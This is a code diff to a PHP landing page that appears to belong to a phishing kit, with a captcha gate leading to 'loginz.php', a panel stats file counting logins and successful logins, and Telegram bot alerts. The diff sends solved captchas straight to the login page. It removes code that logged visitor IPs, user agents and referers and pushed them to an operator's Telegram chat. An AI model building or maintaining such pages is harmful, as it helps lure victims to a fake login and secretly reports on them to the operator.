@@ -12,8 +12,8 @@ include './captcha.php';
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['captcha_answer'])) {
     if (verifyCaptcha($_POST['captcha_answer'])) {
         $_SESSION['captcha_verified'] = true;
-        // Redirect to refresh the page
-        header("Location: " . $_SERVER['REQUEST_URI']);
+        // Redirect directly to login page
+        header("Location: ./views/loginz.php");
         exit;
     } else {
         // Wrong answer, keep the same captcha question
@@ -75,48 +75,7 @@ if (!isset($_SESSION['captcha_verified']) || $_SESSION['captcha_verified'] !== t
     exit;
 }
 
-// Get visitor information
-$ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
-$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'CLI/Test';
-$referer = $_SERVER['HTTP_REFERER'] ?? '';
-$time = date('Y-m-d H:i:s');
-
-// Log visitor data
-$log_data = [
-    'timestamp' => $time,
-    'ip' => $ip,
-    'user_agent' => $user_agent,
-    'referer' => $referer
-];
-
-// Save to log file
-$log_file = './logs/visitors.log';
-$log_entry = json_encode($log_data) . "\n";
-file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
-
-// Update stats
-$stats_file = './app/Panel/stats/stats.ini';
-$stats = @parse_ini_file($stats_file);
-if (!$stats) {
-    $stats = ['visitors' => 0, 'bots' => 0, 'logins' => 0, 'successful_logins' => 0];
-}
-$stats['visitors']++;
-file_put_contents($stats_file, "[stats]\nvisitors = {$stats['visitors']}\nbots = {$stats['bots']}\nlogins = {$stats['logins']}\nsuccessful_logins = {$stats['successful_logins']}\n");
-
-// Telegram Bot 1 - Visitor notification
-if ($enable_telegram) {
-    $message = "🔔 <b>Neuer Besucher auf der Homepage</b>\n\n";
-    $message .= "🌐 <b>IP:</b> $ip\n";
-    $message .= "🕒 <b>Zeit:</b> $time\n";
-    $message .= "🌍 <b>User Agent:</b> $user_agent\n";
-    if ($referer) {
-        $message .= "🔗 <b>Referer:</b> $referer\n";
-    }
-    
-    sendTelegramMessage($telegram_bot1_token, $telegram_bot1_chat_id, $message);
-}
-
-// Redirect to login page
+// If we reach here, captcha is verified, so redirect to login page
 header("Location: ./views/loginz.php");
 exit;
 ?>
